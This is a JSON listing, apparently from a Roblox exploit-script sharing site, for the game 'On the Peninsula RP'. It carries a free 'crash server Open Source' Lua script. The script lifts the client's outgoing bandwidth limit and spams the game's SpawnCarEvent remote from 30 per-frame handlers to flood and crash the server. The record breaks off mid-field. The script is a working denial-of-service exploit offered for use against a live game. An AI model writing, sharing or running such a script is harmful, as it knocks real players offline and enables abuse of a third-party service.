{"id":70909326755468,"name":"On the Peninsula RP","desc":"On the Peninsula is a roleplay game, set in a rural 1990s charming small-town on the peninsula of the US, featuring advanced character customization, car personalization, house furnishing, and more!. Explore, create, and make new friends for endless roleplay possibilities!\n\n👍 Leave a like if you enjoyed! \n\n✨Join our Group to receive exclusive perks in-game like name-tag customization!\nhttps://www.roblox.com/communities/33727810\n\n⚠️This game is still being developed. Please be patient with issues. In-game data stability cannot be guaranteed.","path":"/game/70909326755468-on-the-peninsula-rp","slug":"70909326755468-on-the-peninsula-rp","thumbnail":{"url":"https://cdn.kocakz.me/images/ec583b3145e13e4778280732bb58956d1bc2e40f2e961687e5009f4ced2a2684.webp","original":"https://tr.rbxcdn.com/180DAY-d72417acdae0e33e8664f6d4bf1a8b23/150/150/Image/Png/noFilter"},"playing":4,"visitor":2484301,"verified":false,"updatedAt":"2025-12-28T09:19:05.326Z","creator":{"name":"On the Peninsula","type":"Group"},"script":{"count":1,"freeCount":1,"keyCount":0,"verifiedCount":0},"page":1,"next":null,"total":1,"scripts":[{"slug":"On-the-Peninsula-RP-crash-server-Open-Source-79246","_id":"6950f6099fd82b3b3460a0f1","title":"crash server Open Source","game":{"_id":"6950f6099fd82b3b3460a0ee","gameId":70909326755468,"name":"On the Peninsula RP","imageUrl":{"url":"https://cdn.kocakz.me/images/no-game.webp","original":null},"thumbnail":{"url":"https://cdn.kocakz.me/images/no-game.webp","original":null},"placeId":70909326755468},"features":"crash server","tags":["crash server","server crasher","open source","open src"],"script":"-- @build-failed\n-- crash server\n\nlocal getservice = game.GetService\nlocal runservice, replicatedstorage, networkclient = getservice(game, \"RunService\"), getservice(game, \"ReplicatedStorage\"), getservice(game, \"NetworkClient\")\nnetworkclient:SetOutgoingKBPSLimit(math.huge)\nlocal SpawnCarEvent = replicatedstorage:WaitForChild(\"SystemEvents\"):WaitForChild(\"SpawnCarEvent\")\n\nlocal args = {\n\t\"Spawn\",\n\t\"1972 Fortner F500\",\n\tCFrame.new(241.3, 28, -796.6)\n}\n\nfor i = 1, 30 do\n    runservice.Heartbeat:Connect(function()\n        SpawnCarEvent:FireServer(unpack(args))\n    end)\nend\n","owner":{"_id":"69295f649aebc6b6d35f1e1f","username":"build_failed","verified":false,"profilePicture":{"url":"https://cdn.kocakz.me/images/82a4939e39b35775fb88a91454596042e116701bfdd88636c588a5150408bfea.webp","original":"https://scriptblox.com/images/photo/69295f649aebc6b6d35f1e1f-1766508866434.png"},"lvl":13,"status":"offline","id":"69295f649aebc6b6d35f1e1f","topMilestone":{"key":"creator.scripts","tier":25},"profile":{"url":"https://cdn.kocakz.me/images/82a4939e39b35775fb88a91454596042e116701bfdd88636c588a5150408bfea.webp","original":"https://scriptblox.com/images/photo/69295f649aebc6b6d35f1e1f-1766508866434.png"}},"verified":false,"views":1009,"scriptType":"free","isUniversal":false,"isPatched":false,"visibility":"public","image":{"url":"https://cdn.kocakz.me/images/8c0bc9ad49d4ea9105877234e0d5efe29c8352d187286dbda638c54190e6dcfb.webp","original":"https://scriptblox.com/images/sb/rbx-0c1b53551035b5d23c9d4cdd1e99ee4d-2cc2dc19d367.png","scriptblox":"https://scriptblox.com/images/script/rbx-0c1b53551035b5d23c9d4cdd1e99ee4d-2cc2dc19d367.png"},"likeCount":0,"dislikeCount":0,"createdAt":"2025-12-28T09:19:05.327Z","executes":495,"keyless":false,"liked":false,"disliked":false,"cstatus":{"verdict":"none","pct":null,"conf":0,"n":{"w":0,"b":0,"p":0,"d":0,"k":0},"total":0,"detected":false,"key":false,"recent":0,"at":"2026-10-16T02:33:46.283Z","last":"","win":14,"math":2},"thumbnail":{"url":"https://cdn.kocakz.me/images/8c0bc9ad49d4ea9105877234e0d5efe29c8352d187286dbda638c54190e6dcfb.webp","original":"https://scriptblox.com/images/sb/rbx-0c1b53551035b5d23c9d4cdd1e99ee4d-2cc2dc19d367.png","scriptblox":"https://scriptblox.com/images/script/rbx-0c1b53551035b5d23c9d4cdd1e99ee4d-2cc2dc